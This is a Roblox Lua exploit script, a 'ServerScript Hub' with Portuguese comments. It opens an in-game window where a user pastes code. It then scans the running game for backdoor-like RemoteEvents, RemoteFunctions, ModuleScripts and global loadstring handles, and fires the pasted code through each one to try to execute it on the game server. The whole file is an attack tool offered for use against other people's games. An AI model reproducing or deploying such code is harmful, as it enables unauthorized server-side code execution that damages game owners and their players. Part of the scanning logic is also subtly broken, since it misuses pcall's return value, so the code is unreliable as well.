--[[
    🔥 ServerScript Hub – Executor de scripts no servidor
    Interface completa, arrastável, com botão de fechar.
    Tenta executar seus scripts no servidor através de backdoors.
]]

local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local UIS = game:GetService("UserInputService")
local Tween = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

-- Aguarda o personagem
repeat task.wait() until Player.Character

-- ==================== NOTIFICAÇÕES ====================
local function Notify(title, text, duration)
    duration = duration or 4
    local gui = Instance.new("ScreenGui")
    gui.Parent = CoreGui
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    local frame = Instance.new("Frame")
    frame.Parent = gui
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    frame.BorderSizePixel = 0
    frame.Position = UDim2.new(1, -260, 1, -80)
    frame.Size = UDim2.new(0, 250, 0, 70)
    frame.AnchorPoint = Vector2.new(1, 1)
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Parent = frame
    titleLabel.BackgroundTransparency = 1
    titleLabel.Position = UDim2.new(0, 12, 0, 8)
    titleLabel.Size = UDim2.new(1, -24, 0, 20)
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.Text = title
    titleLabel.TextColor3 = Color3.fromRGB(108, 92, 231)
    titleLabel.TextSize = 14
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Parent = frame
    textLabel.BackgroundTransparency = 1
    textLabel.Position = UDim2.new(0, 12, 0, 30)
    textLabel.Size = UDim2.new(1, -24, 0, 30)
    textLabel.Font = Enum.Font.Gotham
    textLabel.Text = text
    textLabel.TextColor3 = Color3.fromRGB(200, 200, 210)
    textLabel.TextSize = 11
    textLabel.TextXAlignment = Enum.TextXAlignment.Left
    textLabel.TextWrapped = true
    
    local tween = Tween:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), 
        {Position = UDim2.new(1, -20, 1, -80)})
    tween:Play()
    task.wait(duration)
    local tweenOut = Tween:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
        {Position = UDim2.new(1, 300, 1, -80)})
    tweenOut:Play()
    tweenOut.Completed:Connect(function() gui:Destroy() end)
end

-- ==================== INTERFACE ====================
local gui = Instance.new("ScreenGui")
gui.Name = "ServerScriptHub"
gui.Parent = CoreGui
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.ResetOnSpawn = false

local Main = Instance.new("Frame")
Main.Parent = gui
Main.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
Main.BorderSizePixel = 0
Main.Size = UDim2.new(0, 500, 0, 420)
Main.Position = UDim2.new(0.5, -250, 0.5, -210)
Main.ClipsDescendants = true
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
Instance.new("UIStroke", Main).Color = Color3.fromRGB(255, 71, 87)

-- Título
local TitleBar = Instance.new("Frame")
TitleBar.Parent = Main
TitleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
TitleBar.BorderSizePixel = 0
TitleBar.Size = UDim2.new(1, 0, 0, 40)
local titleGradient = Instance.new("UIGradient", TitleBar)
titleGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 71, 87)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 50, 50)),
})
titleGradient.Rotation = 90
local titleCorner = Instance.new("UICorner", TitleBar)
titleCorner.CornerRadius = UDim.new(0, 12)
local titleFix = Instance.new("Frame")
titleFix.Parent = TitleBar
titleFix.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
titleFix.BorderSizePixel = 0
titleFix.Size = UDim2.new(1, 0, 0, 12)
titleFix.Position = UDim2.new(0, 0, 1, -12)

local TitleText = Instance.new("TextLabel")
TitleText.Parent = TitleBar
TitleText.BackgroundTransparency = 1
TitleText.Position = UDim2.new(0, 15, 0, 0)
TitleText.Size = UDim2.new(1, -50, 1, 0)
TitleText.Font = Enum.Font.GothamBlack
TitleText.Text = "🔥 ServerScript Hub"
TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleText.TextSize = 16
TitleText.TextXAlignment = Enum.TextXAlignment.Left

local CloseBtn = Instance.new("TextButton")
CloseBtn.Parent = TitleBar
CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 71, 87)
CloseBtn.BorderSizePixel = 0
CloseBtn.Position = UDim2.new(1, -35, 0, 8)
CloseBtn.Size = UDim2.new(0, 24, 0, 24)
CloseBtn.Text = "✕"
CloseBtn.Font = Enum.Font.GothamBlack
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.TextSize = 12
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)
CloseBtn.MouseButton1Click:Connect(function() gui:Destroy() Notify("Hub", "Fechado") end)

-- Área de script
local ScriptEditor = Instance.new("TextBox")
ScriptEditor.Parent = Main
ScriptEditor.BackgroundColor3 = Color3.fromRGB(12, 12, 20)
ScriptEditor.BorderSizePixel = 0
ScriptEditor.Position = UDim2.new(0, 10, 0, 50)
ScriptEditor.Size = UDim2.new(1, -20, 0, 180)
ScriptEditor.Font = Enum.Font.Code
ScriptEditor.Text = "-- Cole seu script aqui\nprint('Hello, Server!')"
ScriptEditor.TextColor3 = Color3.fromRGB(200, 200, 220)
ScriptEditor.TextSize = 12
ScriptEditor.ClearTextOnFocus = false
ScriptEditor.TextEditable = true
ScriptEditor.TextWrapped = true
ScriptEditor.TextXAlignment = Enum.TextXAlignment.Left
ScriptEditor.TextYAlignment = Enum.TextYAlignment.Top
Instance.new("UICorner", ScriptEditor).CornerRadius = UDim.new(0, 8)

-- Botões de ação
local ExecuteBtn = Instance.new("TextButton")
ExecuteBtn.Parent = Main
ExecuteBtn.BackgroundColor3 = Color3.fromRGB(255, 71, 87)
ExecuteBtn.BorderSizePixel = 0
ExecuteBtn.Position = UDim2.new(0, 10, 0, 238)
ExecuteBtn.Size = UDim2.new(0, 230, 0, 34)
ExecuteBtn.Text = "🚀 EXECUTAR NO SERVIDOR"
ExecuteBtn.Font = Enum.Font.GothamBlack
ExecuteBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteBtn.TextSize = 12
Instance.new("UICorner", ExecuteBtn).CornerRadius = UDim.new(0, 8)

local ClearBtn = Instance.new("TextButton")
ClearBtn.Parent = Main
ClearBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
ClearBtn.BorderSizePixel = 0
ClearBtn.Position = UDim2.new(1, -250, 0, 238)
ClearBtn.Size = UDim2.new(0, 240, 0, 34)
ClearBtn.Text = "🧹 LIMPAR"
ClearBtn.Font = Enum.Font.GothamBlack
ClearBtn.TextColor3 = Color3.fromRGB(200, 200, 220)
ClearBtn.TextSize = 12
Instance.new("UICorner", ClearBtn).CornerRadius = UDim.new(0, 8)

-- Console
local Console = Instance.new("TextBox")
Console.Parent = Main
Console.BackgroundColor3 = Color3.fromRGB(12, 12, 20)
Console.BorderSizePixel = 0
Console.Position = UDim2.new(0, 10, 0, 280)
Console.Size = UDim2.new(1, -20, 0, 130)
Console.Font = Enum.Font.Code
Console.Text = "Console: Aguardando comandos...\n"
Console.TextColor3 = Color3.fromRGB(180, 180, 200)
Console.TextSize = 11
Console.ClearTextOnFocus = false
Console.TextEditable = false
Console.TextWrapped = true
Console.TextXAlignment = Enum.TextXAlignment.Left
Console.TextYAlignment = Enum.TextYAlignment.Top
Instance.new("UICorner", Console).CornerRadius = UDim.new(0, 8)

local function Log(msg)
    Console.Text = Console.Text .. msg .. "\n"
end

-- ==================== MÓDULO DE EXPLORAÇÃO DE BACKDOORS ====================
local backdoorsFound = {}

local function scanForBackdoors()
    Log("🔍 Escaneando o jogo por backdoors...")
    backdoorsFound = {}

    -- 1. Verificar _G e shared
    if _G.loadstring then
        table.insert(backdoorsFound, {name = "_G.loadstring", func = _G.loadstring})
        Log("✅ Encontrado: _G.loadstring")
    end
    if _G.execute then
        table.insert(backdoorsFound, {name = "_G.execute", func = _G.execute})
        Log("✅ Encontrado: _G.execute")
    end
    if shared and shared.loadstring then
        table.insert(backdoorsFound, {name = "shared.loadstring", func = shared.loadstring})
        Log("✅ Encontrado: shared.loadstring")
    end

    -- 2. Procurar RemoteEvents com nomes suspeitos
    local suspiciousNames = {"Execute", "Run", "Load", "Eval", "Script", "Server", "Command", "Admin", "Backdoor"}
    local function searchContainer(container)
        for _, obj in ipairs(container:GetChildren()) do
            local lowerName = obj.Name:lower()
            for _, name in ipairs(suspiciousNames) do
                if lowerName:find(name:lower()) then
                    if obj:IsA("RemoteEvent") then
                        table.insert(backdoorsFound, {
                            name = "RemoteEvent: " .. obj:GetFullName(),
                            remote = obj,
                            type = "RemoteEvent"
                        })
                        Log("✅ Encontrado RemoteEvent: " .. obj:GetFullName())
                    elseif obj:IsA("RemoteFunction") then
                        table.insert(backdoorsFound, {
                            name = "RemoteFunction: " .. obj:GetFullName(),
                            remote = obj,
                            type = "RemoteFunction"
                        })
                        Log("✅ Encontrado RemoteFunction: " .. obj:GetFullName())
                    end
                end
            end
            -- Recursivo
            searchContainer(obj)
        end
    end

    searchContainer(Workspace)
    searchContainer(ReplicatedStorage)
    searchContainer(Lighting)

    -- 3. Procurar por require em ModuleScripts expostos
    local function findRequireBackdoors()
        for _, obj in ipairs(Workspace:GetDescendants()) do
            if obj:IsA("ModuleScript") then
                local source = pcall(function() return obj.Source end)
                if source and type(source) == "string" then
                    if source:find("loadstring") or source:find("execute") then
                        table.insert(backdoorsFound, {
                            name = "ModuleScript: " .. obj:GetFullName(),
                            module = obj,
                            type = "ModuleScript"
                        })
                        Log("✅ Encontrado ModuleScript suspeito: " .. obj:GetFullName())
                    end
                end
            end
        end
    end
    findRequireBackdoors()

    Log("📊 Total de backdoors encontradas: " .. #backdoorsFound)
end

-- ==================== EXECUÇÃO DE SCRIPTS ====================
local function executeScript(scriptCode)
    if #backdoorsFound == 0 then
        Log("❌ Nenhuma backdoor encontrada. Tente escanear novamente.")
        return false
    end

    Log("🚀 Tentando executar via " .. #backdoorsFound .. " backdoors...")
    local success = false

    for _, backdoor in ipairs(backdoorsFound) do
        if backdoor.type == "RemoteEvent" then
            -- Tenta FireServer com o script como argumento
            pcall(function()
                backdoor.remote:FireServer(scriptCode)
                Log("✅ Enviado via RemoteEvent: " .. backdoor.name)
                success = true
            end)
        elseif backdoor.type == "RemoteFunction" then
            -- Tenta InvokeServer
            local result = pcall(function()
                return backdoor.remote:InvokeServer(scriptCode)
            end)
            if result then
                Log("✅ Executado via RemoteFunction: " .. backdoor.name)
                Log("📤 Retorno: " .. tostring(result))
                success = true
            end
        elseif backdoor.type == "ModuleScript" then
            -- Tenta require + executar
            pcall(function()
                local module = require(backdoor.module)
                if type(module) == "function" then
                    module(scriptCode)
                    Log("✅ Executado via ModuleScript: " .. backdoor.name)
                    success = true
                end
            end)
        elseif backdoor.func then
            -- Função direta
            pcall(function()
                backdoor.func(scriptCode)
                Log("✅ Executado via função: " .. backdoor.name)
                success = true
            end)
        end
    end

    if not success then
        Log("❌ Nenhuma backdoor conseguiu executar o script.")
    end
    return success
end

-- ==================== INICIALIZAÇÃO ====================
scanForBackdoors()

-- ==================== EVENTOS DOS BOTÕES ====================
ExecuteBtn.MouseButton1Click:Connect(function()
    local code = ScriptEditor.Text
    if code:gsub("%s", "") == "" then
        Notify("Aviso", "Digite um script primeiro!")
        return
    end
    Log("📝 Executando script...")
    local ok = executeScript(code)
    if ok then
        Notify("Sucesso", "Script enviado ao servidor!", 2)
    else
        Notify("Falha", "Nenhuma backdoor funcionou.")
    end
end)

ClearBtn.MouseButton1Click:Connect(function()
    ScriptEditor.Text = "-- Cole seu script aqui"
    Log("🧹 Console limpo.")
end)

-- ==================== ARRASTE ====================
local dragging, startPos, startGuiPos
TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        startPos = input.Position
        startGuiPos = Main.Position
    end
end)
UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - startPos
        Main.Position = UDim2.new(
            startGuiPos.X.Scale, startGuiPos.X.Offset + delta.X,
            startGuiPos.Y.Scale, startGuiPos.Y.Offset + delta.Y
        )
    end
end)
UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

Notify("🔥 ServerScript Hub", "Hub carregado! Escaneie backdoors e execute scripts.", 5)
